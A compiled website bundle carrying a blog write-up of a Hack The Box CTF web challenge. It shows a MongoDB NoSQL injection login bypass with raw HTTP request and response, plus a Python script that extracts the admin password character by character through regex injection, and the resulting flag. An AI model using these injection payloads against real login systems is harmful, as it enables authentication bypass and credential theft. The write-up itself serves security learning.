"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[7950],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>d});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},u="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},g=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=c(n),g=r,d=u["".concat(l,".").concat(g)]||u[g]||h[g]||o;return n?a.createElement(d,i(i({ref:t},p),{},{components:n})):a.createElement(d,i({ref:t},p))}));function d(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=g;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[u]="string"==typeof e?e:r,i[1]=s;for(var c=2;c<o;c++)i[c]=n[c];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}g.displayName="MDXCreateElement"},9584:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>h,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var a=n(7462),r=(n(7294),n(3905));const o={slug:"wild-goose-hunt-cyberapocalypse-2021-ctf",title:"Wild goose hunt - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Wild goose hunt challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},i=void 0,s={permalink:"/blog/wild-goose-hunt-cyberapocalypse-2021-ctf",source:"@site/blog/2021-04-27-17:50:25wild-goose-hunt-cyberapocalypse-2021-ctf.md",title:"Wild goose hunt - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Wild goose hunt challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",date:"2021-04-27T00:00:00.000Z",formattedDate:"April 27, 2021",tags:[{label:"Cyber Security",permalink:"/blog/tags/cyber-security"},{label:"CTF",permalink:"/blog/tags/ctf"}],readingTime:2.575,hasTruncateMarker:!0,authors:[{name:"Kiril Panayotov Blagoev",title:"Admin",url:"https://github.com/tihawk",imageURL:"https://github.com/tihawk.png",key:"kiroki"}],frontMatter:{slug:"wild-goose-hunt-cyberapocalypse-2021-ctf",title:"Wild goose hunt - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Wild goose hunt challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},prevItem:{title:"Soulcrabber - Cyberapocalypse 2021 CTF",permalink:"/blog/soulcrabber-cyberapocalypse-2021-ctf"},nextItem:{title:"Phasestream 1- Cyberapocalypse 2021 CTF",permalink:"/blog/phasestream-1-cyberapocalypse-2021-ctf"}},l={authorsImageUrls:[void 0]},c=[{value:"Prompt",id:"prompt",level:3},{value:"Recon",id:"recon",level:3},{value:"Attempting to log in",id:"attempting-to-log-in",level:3},{value:"Solution",id:"solution",level:3}],p={toc:c},u="wrapper";function h(e){let{components:t,...o}=e;return(0,r.kt)(u,(0,a.Z)({},p,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("p",null,"This is a writeup for the Wild goose hunt challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web."),(0,r.kt)("h3",{id:"prompt"},"Prompt"),(0,r.kt)("p",null,"Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?"),(0,r.kt)("h3",{id:"recon"},"Recon"),(0,r.kt)("p",null,"We're given source-code for a web-site, and a hosted version."),(0,r.kt)("p",null,"With a quick overview of the code we're given, we see that the site uses ",(0,r.kt)("inlineCode",{parentName:"p"},"mongodb")," as its database. Albeit slightly dumb, I didn't go into any more detail than this, and didn't check where the flag is actually hidden."),(0,r.kt)("h3",{id:"attempting-to-log-in"},"Attempting to log in"),(0,r.kt)("p",null,"My initial idea was to simply log into the site, and see if that doesn't display the flag. So, I intercepted a login request with Burpsuite, and changed the POST request data to a classic mongo injection string,"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-yaml"},"POST /api/login HTTP/1.1\nHost: localhost:1337\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://localhost:1337/\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nOrigin: http://localhost:1337\nContent-Length: 35\nConnection: close\n\nusername[$ne]=foo&password[$ne]=bar\n")),(0,r.kt)("p",null,"Which returns a login success message."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-yaml"},'HTTP/1.1 200 OK\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 62\nETag: W/"3e-BvDyP4u8qgWgGOMxzemBf6QGSBc"\nDate: Tue, 27 Apr 2021 17:31:15 GMT\nConnection: close\n\n{"logged":1,"message":"Login Successful, welcome back admin."}\n')),(0,r.kt)("p",null,"But upon observing the login page of the site, we find nothing, but a welcome message."),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"welcome message",src:n(5275).Z,width:"1073",height:"99"})),(0,r.kt)("p",null,"So at this point, I just assumed that the flag is the password itself (which I would had already known, if I had checked the ",(0,r.kt)("inlineCode",{parentName:"p"},"entrypoint.sh")," script)."),(0,r.kt)("h3",{id:"solution"},"Solution"),(0,r.kt)("p",null,"In order to correctly guess the password (and know what it is), we are going to once again use nosql injection, but this time we will use the ","[$regex]"," query for mongo."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"We send a POST request to ",(0,r.kt)("inlineCode",{parentName:"li"},"/api/login")," using the username ",(0,r.kt)("inlineCode",{parentName:"li"},"admin")," and a regex match query for the password with a random (printable) character."),(0,r.kt)("li",{parentName:"ol"},"If the login is successful, we assume that this character is indeed part of the password, so we add it to our flag, and try again with the next position in the password"),(0,r.kt)("li",{parentName:"ol"},"Simple as that, let's script it")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'import requests\nimport string\n\n# Assumptions\n# We suspect that the password is the flag\n# the flag starts with "CBTH{"\n# and ends with "}"\n\nflag = "CHTB{"\nurl = "http://165.227.236.40:31535/api/login"\n\n# Each time a login is successful, we should start the loop from the first character\nstartFromFirstChar = True\n\nwhile startFromFirstChar:\n    startFromFirstChar = False\n\n    # avoiding characters like * . & +\n    for char in string.ascii_letters + string.digits + "!@#$%^()@_{}":\n        payload = flag + char\n        post_data = {\'username\': \'admin\', \'password[$regex]\': payload + ".*"}\n        r = requests.post(url, data=post_data)\n\n        # A correct password means we get "logged":1 in response\n        if (\'"logged":1\' in r.text):\n            print(payload)\n            startFromFirstChar = True\n            flag = payload\n\n            # Exit if "}" is at the end and we are logged in\n            if char == "}":\n                print("\\nFlag: " + flag)\n                exit(0)\n            break\n')),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"running",src:n(6927).Z,width:"988",height:"816"})),(0,r.kt)("p",null,"And so, we get our flag"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sh"},"CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}\n")))}h.isMDXComponent=!0},5275:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/Screenshot_2021-04-27_20-34-50-a0cdfc4c6016dfe9f794d8c3e38a9030.png"},6927:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/Screenshot_2021-04-28_09-21-31-1da42f63f643d694cf243c0ce71f261a.png"}}]);